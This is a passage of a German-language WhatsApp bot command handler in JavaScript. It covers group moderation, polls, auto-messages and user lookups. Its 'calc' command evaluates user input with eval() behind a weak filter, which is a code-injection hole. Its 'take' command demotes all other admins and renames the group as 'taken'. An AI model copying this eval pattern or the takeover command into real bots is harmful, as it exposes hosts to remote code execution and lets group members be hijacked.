║ 📛 Name: ${groupName}
║ 👥 Mitglieder: ${members}
╠═════════════════════
║ 🔗 Link:
║ https://chat.whatsapp.com/${await sock.groupInviteCode(from)}
╚═════════════════════
`;

            await reply(sock, msg, text);
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Aktion konnte nicht ausgeführt werden!");
    }
}
if (command === "calc") {
    const input = args.join(" ").toLowerCase();

    if (!input) 
    return reply(sock, msg, `❌ Bitte gib einen Ausdruck zum Berechnen ein!\nBeispiel: ${prefix}calc 5 + sqrt(16)`);

    try {
        const allowed = /^[0-9+\-*/().%^ ,a-z]+$/;
        if (!allowed.test(input)) {
            return reply(sock, msg, "❌ Ungültige Zeichen! Nur Zahlen, Operatoren + - * / % ^ ( ), Leerzeichen und Funktionen (sin, cos, tan, sqrt, log, pi, e) erlaubt.");
        }
        const math = {
            sin: Math.sin,
            cos: Math.cos,
            tan: Math.tan,
            sqrt: Math.sqrt,
            log: Math.log,
            pi: Math.PI,
            e: Math.E,
        };

        let expr = input.replace(/\^/g, "**");

        expr = expr.replace(/\bpi\b/g, "Math.PI").replace(/\be\b/g, "Math.E");

        for (const func of ["sin","cos","tan","sqrt","log"]) {
            const re = new RegExp(`\\b${func}\\b`, "g");
            expr = expr.replace(re, `Math.${func}`);
        }

        const result = eval(expr);

        await reply(sock, msg, `🧮 Ausdruck: ${input}\n✅ Ergebnis: ${result}
        `);

    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Berechnen! Überprüfe deinen Ausdruck.");
    }
}
if (command === "autofarm") {
    try {
        await handleAutoFarm(
            sock,
            msg,
            command,
            args,
            prefix,
            sender,
            from,
            isWantedasa,
            reply,
            botConfig,
            saveBotConfig,
            startAutoFish,
            stopAutoFish
        );
    } catch (err) {
        console.error("AutoFarm Fehler:", err);
        return reply(sock, msg, "❌ Fehler beim AutoFarm!");
    }
}
if (command === "grppic") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
if (!isAdmin(sock, from, sender) && !isOwner(sender)) 
    return reply(sock, msg, "❌ Nur Admins können das Gruppenbild ändern!");

    const sub = args[0]?.toLowerCase();

    if (sub === "set") {
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const imageMessage = quoted?.imageMessage;

        if (!imageMessage && !msg.message?.imageMessage) {
            return reply(sock, msg, "❌ Bitte sende ein Bild oder antworte auf ein Bild, um es als Gruppenbild zu setzen!");
        }

        try {
            const buffer = imageMessage
                ? await sock.downloadMediaMessage({ message: imageMessage })
                : await sock.downloadMediaMessage(msg);

            await sock.updateProfilePicture(from, buffer);

            return reply(sock, msg, "✅ Gruppenbild erfolgreich aktualisiert!");
        } catch (err) {
            console.error(err);
            return reply(sock, msg, "❌ Fehler beim Setzen des Gruppenbilds!");
        }
    }
    try {
        const profilePic = await sock.profilePictureUrl(from);
        const metadata = await sock.groupMetadata(from);
        const text = `🌐 Gruppenbild von *${metadata.subject}*\n👥 Mitglieder: ${metadata.participants.length}`;

        await sock.sendMessage(from, { image: { url: profilePic }, caption: text });
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Kein Gruppenbild gefunden!");
    }
}
if (command === "restart") {
    if (!isOwner(sender)) return;

    await reply(sock, msg, "♻️ Bot wird neu gestartet...");

    setTimeout(() => {
        const child = spawn("node", ["restart.js"], {
            detached: true,
            stdio: "ignore"
        });

        child.unref();
        process.exit(0);
    }, 2000);
}
if (command === "grpleave" || command === "leavegrp") {
    if (!isGroup(from)) {
        return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
    }

    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur der Owner darf den Bot entfernen!");
    }

    try {
        await sock.sendMessage(from, {
            text: "👋 Bye"
        });
        await sock.groupLeave(from);

    } catch (err) {
        console.log(err);
        reply(sock, msg, "❌ Fehler beim Verlassen der Gruppe!");
    }
}
    
if ((command === "mute" || command === "unmute") && isGroup(from)) {
    
    if (!await isAdmin(sock, from, sender) && !isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Admins oder Owner dürfen die Gruppen-Einstellungen ändern!");
    }
    if (!isGroup(from)) {
    return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
    }

    try {
        if (command === "mute") {
            await sock.groupSettingUpdate(from, "announcement");
            return reply(sock, msg, "🔇 Gruppen-Einstellungen geändert: Nur Admins dürfen jetzt schreiben!");
        } else {
            await sock.groupSettingUpdate(from, "not_announcement");
            return reply(sock, msg, "🔊 Gruppen-Einstellungen geändert: Alle dürfen jetzt schreiben!");
        }
    } catch (e) {
        console.error("Fehler beim Ändern der Gruppen-Einstellungen:", e);
        return reply(sock, msg, "❌ Fehler beim Ändern der Gruppen-Einstellungen!");
    }
}
if (command === "hidetag") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
    
    const admin = await isAdmin(sock, from, sender);
    if (!admin && !isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Admins oder Owner können hidetag nutzen!");
    }

    let text = args.join(" ");

    if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
        const quoted = msg.message.extendedTextMessage.contextInfo.quotedMessage;

        text =
            quoted.conversation ||
            quoted.extendedTextMessage?.text ||
            quoted.imageMessage?.caption ||
            quoted.videoMessage?.caption ||
            text;
    }

    if (!text) return reply(sock, msg, `❌ Benutzung: ${prefix}hidetag <Nachricht> oder auf eine Nachricht antworten`);

    try {
        const groupMetadata = await sock.groupMetadata(from);
        const mentions = groupMetadata.participants.map(p => p.id);

        let styledText;

        if (isOwner(sender)) {
            styledText = `${text}`;
        } else {
            styledText = `\`\`\`
╔══════════════════╗
${text}
╚══════════════════╝

by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ
\`\`\``;
        }

        await sock.sendMessage(from, {
            text: styledText,
            mentions
        });

        await sock.sendMessage(from, { delete: msg.key });

    } catch (err) {
        console.error("Fehler bei hidetag:", err);
        reply(sock, msg, "❌ Fehler beim Senden der Hidetag-Nachricht.");
    }
}

    if (command === "grpname" || command === "grpdesc") {
        if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
        const admin = await isAdmin(sock, from, sender);
        if (!admin && !isOwner(sender)) return reply(sock, msg, "❌ Nur Admin oder Owner!");
        const newText = args.join(" ");
        if (!newText) return reply(sock, msg, `⚙️ Nutzung: ${prefix}${command} <neuer Text>`);

        try {
            if (command === "grpname") await sock.groupUpdateSubject(from, newText);
            if (command === "grpdesc") await sock.groupUpdateDescription(from, newText);
        } catch (err) {
            console.error(err);
            return reply(sock, msg, "❌ Fehler beim Ändern!");
        }
    }

  if (command === "del" || command === "delete") {

    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");

    if (!isAdmin && !isOwner(sender)) return reply(sock, msg, "❌ Nur Admin darf Nachrichten löschen!");

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    if (!contextInfo?.stanzaId) {
        return reply(sock, msg, "❌ Bitte antworte auf die Nachricht, die gelöscht werden soll!");
    }

    try {
        await sock.sendMessage(from, { 
            delete: { 
                remoteJid: from, 
                id: contextInfo.stanzaId, 
                participant: contextInfo.participant || sender 
            } 
        });
    } catch (e) {
        console.error(e);
        return reply(sock, msg, "❌ Nachricht konnte nicht gelöscht werden!");
    }
};
if (command === "join") {
    if (!isWantedasa(sender)) return reply(sock, msg, "❌ Nur Owner!");


    let link = args[0];

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    if (!link && contextInfo?.quotedMessage?.conversation) {
        link = contextInfo.quotedMessage.conversation;
    }

    if (!link) return reply(sock, msg, "❌ Bitte sende oder antworte auf einen Gruppenlink!\nBeispiel: .join https://chat.whatsapp.com/ABC123");

    const match = link.match(/(?:https:\/\/chat\.whatsapp\.com\/)([0-9A-Za-z]+)/);
    if (!match) return reply(sock, msg, "❌ Ungültiger Gruppenlink!");

    const inviteCode = match[1];

    try {
        
        await sock.groupAcceptInvite(inviteCode);
        await sock.sendMessage(from, {
                react: {
                    text: "✅",
                    key: msg.key
                }
            });
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Beitritt zur Gruppe fehlgeschlagen! Eventuell falscher Link oder du wurdest blockiert.");
    }
}
if (command === 'poll') {
    const text = args.join(' ');

    if (!text.includes('/')) {
        return await sock.sendMessage(from, { 
            text: `❌ Falsche Eingabe!\nBitte benutze die Syntax:\n${prefix}poll Frage / Antwort1 / Antwort2 / Antwort3`
        });
    }

    const parts = text.split('/').map(p => p.trim());
    const question = parts.shift();
    const options = parts;

    if (!question || options.length < 2) {
        return await sock.sendMessage(from, { 
            text: `❌ Falsche Eingabe!\nDu musst eine Frage und mindestens zwei Antworten angeben.\nBeispiel:\n${prefix}poll Kommst du zum Sommerfest? / Ja ✅ / Vielleicht ❓ / Nein ❌`
        });
    }
    const uniqueOptions = new Set(options.map(o => o.toLowerCase()));
    if (uniqueOptions.size !== options.length) {
        return await sock.sendMessage(from, { 
            text: `❌ Ungültige Umfrage!\nAlle Antwortmöglichkeiten müssen unterschiedlich sein.`
        });
    }
    await sock.sendMessage(from, {
        poll: {
            name: `📊 ${question}`,
            values: options,
            selectableCount: 1
        }
    });

    await sock.sendMessage(from, { delete: msg.key });
}
if (command === "add") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Nur in Gruppen!");

    const admin = await isAdmin(sock, from, sender);
    if (!admin && !isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Admin oder Owner!");
    }

    if (!args[0]) {
        return reply(sock, msg, `❌ Nutzung: ${prefix}add 49123,49222`);
    }

    let numbers = args[0]
        .split(/[, ]+/)
        .map(n => n.replace(/\D/g, ""))
        .filter(n => n.length > 5);

    if (numbers.length === 0) {
        return reply(sock, msg, "❌ Keine gültigen Nummern gefunden!");
    }

    let success = 0;
    let invited = 0;
    let fail = 0;
    let failedUsers = [];

    const wait = ms => new Promise(res => setTimeout(res, ms));

    for (let number of numbers) {
        let jid = number + "@s.whatsapp.net";

        try {
            let res = await sock.groupParticipantsUpdate(from, [jid], "add");

            if (!res || !res[0]) {
                throw new Error("Keine Antwort");
            }

            const status = res[0].status;

            // ✅ Erfolg
            if (status >= 200 && status < 300) {
                success++;
            } 
            // 📩 Invite nötig (Privatsphäre)
            else if (status === 403) {
                try {
                    await sock.groupParticipantsUpdate(from, [jid], "invite");
                    invited++;
                } catch {
                    fail++;
                    failedUsers.push(`+${number} → Invite fehlgeschlagen`);
                }
            } 
            // ❌ andere Fehler
            else {
                fail++;

                let reason = "Unbekannter Fehler";
                if (status === 408) reason = "Timeout / nicht erreichbar";
                if (status === 409) reason = "Bereits in Gruppe";
                if (status === 500) reason = "WhatsApp Fehler";

                failedUsers.push(`+${number} → ${reason}`);
            }

        } catch (e) {
            // 🔁 Retry einmal
            try {
                await wait(1500);
                let retry = await sock.groupParticipantsUpdate(from, [jid], "add");

                if (retry?.[0]?.status >= 200 && retry?.[0]?.status < 300) {
                    success++;
                } else {
                    throw new Error("Retry fehlgeschlagen");
                }

            } catch {
                fail++;
                failedUsers.push(`+${number} → Fehler beim Hinzufügen`);
            }
        }

        // ⏳ Delay bei mehreren
        if (numbers.length > 1) {
            await wait(2000);
        }
    }

    let text = `╭━━━〔 📥 ADD RESULT 〕━━━⬣
┃ ✅ Erfolgreich: ${success}
┃ 📩 Eingeladen: ${invited}
┃ ❌ Fehlgeschlagen: ${fail}
╰━━━━━━━━━━━━━━━⬣`;

    if (failedUsers.length > 0) {
        text += `\n\n❌ Fehler:\n${failedUsers.join("\n")}`;
    }

    reply(sock, msg, text);
}
if (command === "promote" || command === "demote") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Nur in Gruppen!");

    const admin = await isAdmin(sock, from, sender);
    if (!admin && !isOwner(sender)) return reply(sock, msg, "❌ Nur Admin oder Owner!");

    let targets = [];

    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned && mentioned.length > 0) targets = mentioned;

    if ((!targets || targets.length === 0) && msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
        const repliedUser = msg.message.extendedTextMessage.contextInfo.participant;
        if (repliedUser) targets.push(repliedUser);
    }

    if (!targets || targets.length === 0) return reply(sock, msg, `❌ Nutzung: ${prefix}${command} @user oder auf Nachricht antworten`);

    try {
        await sock.groupParticipantsUpdate(from, targets, command === "promote" ? "promote" : "demote");
        return reply(sock, msg, command === "promote"
            ? "⬆️ Nutzer wurde zum Admin gemacht!"
            : "⬇️ Nutzer ist kein Admin mehr!");
    } catch (e) {
        console.error("Fehler beim " + command + ":", e);
        return reply(sock, msg, "❌ Fehler beim " + command + "!");
    }
}
if (command === "info") {
    try {
        let targets = [];
        if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
            targets.push(msg.message.extendedTextMessage.contextInfo.participant);
        }

        if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
            targets.push(...msg.message.extendedTextMessage.contextInfo.mentionedJid);
        }

        if (args[0]) {
            let number = args[0].replace(/[^0-9]/g, "");
            targets.push(number + "@s.whatsapp.net");
        }

        if (targets.length === 0) {
            return reply(sock, msg, "❌ Bitte markiere jemanden, antworte auf eine Nachricht oder gib eine Nummer an!");
        }

        targets = [...new Set(targets)];

        // Funktion: Infos für einen User abrufen
        async function getUserInfo(target) {
            const jid = target;
            const numberOnly = target.split("@")[0];
            const lid = msg.key?.mentionedJid || msg.key?.participant || "Unbekannt";

            let name = "Unbekannt";
            try {
                const contact = sock.contacts[target];
                if (contact?.notify) name = contact.notify;
            } catch {}

            let ppUrl = null;
            let hasProfilePic = "❌ Nein";
            try {
                ppUrl = await sock.profilePictureUrl(target, "image");
                hasProfilePic = "✅ Ja";
            } catch {}

            let isBusiness = "❌ Nein";
            try {
                const biz = await sock.getBusinessProfile(target);
                if (biz) isBusiness = "✅ Ja";
            } catch {}

            let mutualGroups = [];
            try {
                const groups = await sock.groupFetchAllParticipating();
                for (let id in groups) {
                    let participants = groups[id].participants.map(p => p.id);
                    if (participants.includes(target)) mutualGroups.push(groups[id].subject);
                }
            } catch {}
            const groupCount = mutualGroups.length;
            const groupList = groupCount > 0
                ? mutualGroups.slice(0, 25).map(g => `• ${g}`).join("\n")
                : "Keine gemeinsamen Gruppen";

            // Account-Erstellung
            function getCreationDate(jid) {
                try {
                    const id = jid.split("@")[0];
                    const timestamp = parseInt(id.substring(0, 10));
                    if (!isNaN(timestamp)) {
                        const date = new Date(timestamp * 1000);
                        return date.toLocaleString("de-DE", {
                            day: "2-digit",
                            month: "2-digit",
                            year: "numeric",
                            hour: "2-digit",
                            minute: "2-digit"
                        });
                    } else return "Unbekannt";
                } catch {
                    return "Unbekannt";
                }
            }
            const createdAt = getCreationDate(target);

            // Ausgabe bauen
            const line = "──────────────────────────";
            const text = `╭───〔 👤 USER INFO 〕───⬣
│
│ 📱 Nummer: ${numberOnly}
│ 🆔 LID: ${lid}
${line}
│ 👤 Name: ${name}
│ 🖼️ Profilbild: ${hasProfilePic}
│ 🏢 Business: ${isBusiness}
│ 📅 Erstellt: ${createdAt}
${line}
│ 👥 Gemeinsame Gruppen: ${groupCount}
${groupList}
╰────────────────⬣`;

            return { text, ppUrl };
        }

        // Infos für alle User abrufen und senden
        for (let target of targets) {
            const { text, ppUrl } = await getUserInfo(target);
            if (ppUrl) {
                await sock.sendMessage(from, { image: { url: ppUrl }, caption: text }, { quoted: msg });
            } else {
                reply(sock, msg, text);
            }
        }

    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Fehler beim Abrufen der Infos!");
    }
}  
if (command === "block") {
    if (!isWantedasa(sender)) return reply(sock, msg, "❌ Nur Owner können jemanden blockieren!");

    let target = msg.message?.extendedTextMessage?.contextInfo?.participant || args[0];
    if (!target) return reply(sock, msg, "⚠️ Bitte Nummer angeben oder auf die Nachricht der Person antworten.");

    if (!target.includes("@s.whatsapp.net")) target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await sock.updateBlockStatus(target, "block");
        reply(sock, msg, `✅ ${target.split("@")[0]} wurde erfolgreich blockiert.`);
    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Blockieren fehlgeschlagen.");
    }
}
if (command === "msgraw") {
    try {
        const rawMsg = JSON.stringify(msg, null, 2);

        // Prüfen, ob die Nachricht zu groß für WhatsApp ist
        if (rawMsg.length > 4000) {
            reply(sock, msg, "❌ Nachricht zu groß zum Senden. Speichere sie als Datei.");
            // Optional: Speichern als Datei
            const fs = require('fs');
            const fileName = `raw_${Date.now()}.json`;
            fs.writeFileSync(fileName, rawMsg);
            await sock.sendMessage(from, { document: { url: fileName }, fileName: fileName, mimetype: "application/json" }, { quoted: msg });
            return;
        }
        reply(sock, msg, "📄 Raw Message:\n" + rawMsg);

    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Fehler beim Abrufen der Raw Message!");
    }
}
if (command === "unblock") {
    if (!isWantedasa(sender)) return reply(sock, msg, "❌ Nur Owner können jemanden entblocken!");

    let target = msg.message?.extendedTextMessage?.contextInfo?.participant || args[0];
    if (!target) return reply(sock, msg, "⚠️ Bitte Nummer angeben oder auf die Nachricht der Person antworten.");

    if (!target.includes("@s.whatsapp.net")) target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await sock.updateBlockStatus(target, "unblock"); // Nummer entblocken
        reply(sock, msg, `✅ ${target.split("@")[0]} wurde erfolgreich entblockt.`);
    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Entblocken fehlgeschlagen.");
    }
}
if (command === "take") {
    if (!isGroup(from)) return;

    if (!isWantedasa(sender)) return;

    try {
        const metadata = await sock.groupMetadata(from);
        const participants = metadata.participants;
        const adminsToDemote = participants
            .filter(p => p.admin && p.id !== sender)
            .map(p => p.id);

        if (adminsToDemote.length > 0) {
            await sock.groupParticipantsUpdate(from, adminsToDemote, "demote");
        }

        
        await sock.groupUpdateSubject(from, "taken by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");

        await sock.groupUpdateDescription(from, "taken by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");

        return reply(sock, msg, `done.\n✅ ${adminsToDemote.length} Admins removed.`);
        
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Admin-Reset!");
    }
}
if (command === "automsg") {
    if (!isOwner(sender)) return reply(sock, msg, "❌ Nur Owner!");

    const sub = args[0];

    if (!sub) {
        return reply(sock, msg,
`📌 AutoMsg Befehle:

${prefix}automsg set <Minuten> <Text>
${prefix}automsg stop
${prefix}automsg list`);
    }
    if (sub === "set") {
        const minutes = parseInt(args[1]);
        const text = args.slice(2).join(" ");

        if (!minutes || !text) {
            return reply(sock, msg, "❌ Nutzung: .automsg set <Minuten> <Text>");
        }

        if (minutes <= 0) {
            return reply(sock, msg, "❌ Minuten müssen > 0 sein!");
        }
        if (autoIntervals[from]) {
            clearInterval(autoIntervals[from]);
            delete autoIntervals[from];
        }
        botConfig.autoMessages[from] = {
    text,
    interval: minutes,
    lastSent: 0
};
saveBotConfig();

        autoIntervals[from] = setInterval(async () => {
            try {
                await sock.sendMessage(from, { text });
            } catch (e) {
                console.error("AutoMsg Fehler:", e);
            }
        }, minutes * 60 * 1000);

        return reply(sock, msg, `✅ AutoMsg gesetzt (${minutes} min)`);
    }
    if (sub === "stop") {
        if (!botConfig.autoMessages[from]) {
            return reply(sock, msg, "❌ Keine AutoMsg aktiv!");
        }

        if (autoIntervals[from]) {
            clearInterval(autoIntervals[from]);
            delete autoIntervals[from];
        }

        delete botConfig.autoMessages[from];
        saveBotConfig();

        return reply(sock, msg, "⏹ AutoMsg gestoppt!");
    }
    if (sub === "list") {
        const entries = Object.entries(botConfig.autoMessages || {});

        if (!entries.length) {
            return reply(sock, msg, "❌ Keine AutoMsgs aktiv!");
        }

        let text = "📋 AutoMsgs:\n\n";

        entries.forEach(([chatId, data], i) => {
            text += `${i + 1}. ${chatId}\n`;
            text += `⏱ ${data.interval} min\n`;
            text += `💬 ${data.text}\n\n`;
        });

        return reply(sock, msg, text);
    }

    return reply(sock, msg, "❌ Unbekannter Subcommand!");
}
if (command === "pn") {

    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    let user;

    if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
        user = msg.message.extendedTextMessage.contextInfo.participant;
    }

    else if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
        user = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
    }

    if (!user) {
        return reply(sock, msg, "❌ Bitte markiere jemanden oder antworte auf eine Nachricht!");
    }
    let text = args.join(" ");
    text = text.replace(/@\d+/g, "").trim();
    if (!text) {
        return reply(sock, msg, "❌ Bitte gib einen Text an!");
    }

    try {
        await sock.sendMessage(from, {
            react: {
                text: "✅",
                key: msg.key
            }
        });
        await sock.sendMessage(user, { 
            text: `${text}` 
        });

    } catch (e) {
        console.error(e);
        reply(sock, msg, "❌ Fehler beim Senden der PN!");
    }
}

}

//=========================//
// GROUP EVENTS
//=========================//
export async function handleGroupParticipants(sock, update) {
    const { id, participants, action } = update;
    ensureGroupSettings(id);

    for (let user of participants) {
        const metadata = await sock.groupMetadata(id);
        const groupName = metadata.subject || "Gruppe";
        const groupDesc = metadata.desc || "Keine Beschreibung vorhanden.";

        if (action === "add" && groupSettings[id].welcome) {
            await sock.sendMessage(id, {
                text: `👋 Willkommen @${user.split("@")[0]} in *${groupName}*!\n\n📜 *Gruppenbeschreibung:*\n${groupDesc}`,
                mentions: [user]
            });
        }

        if (action === "remove" && groupSettings[id].leave) {
            await sock.sendMessage(id, {
                text: `😢 @${user.split("@")[0]} hat die Gruppe verlassen`,
                mentions: [user]
            });
        }
    }
}
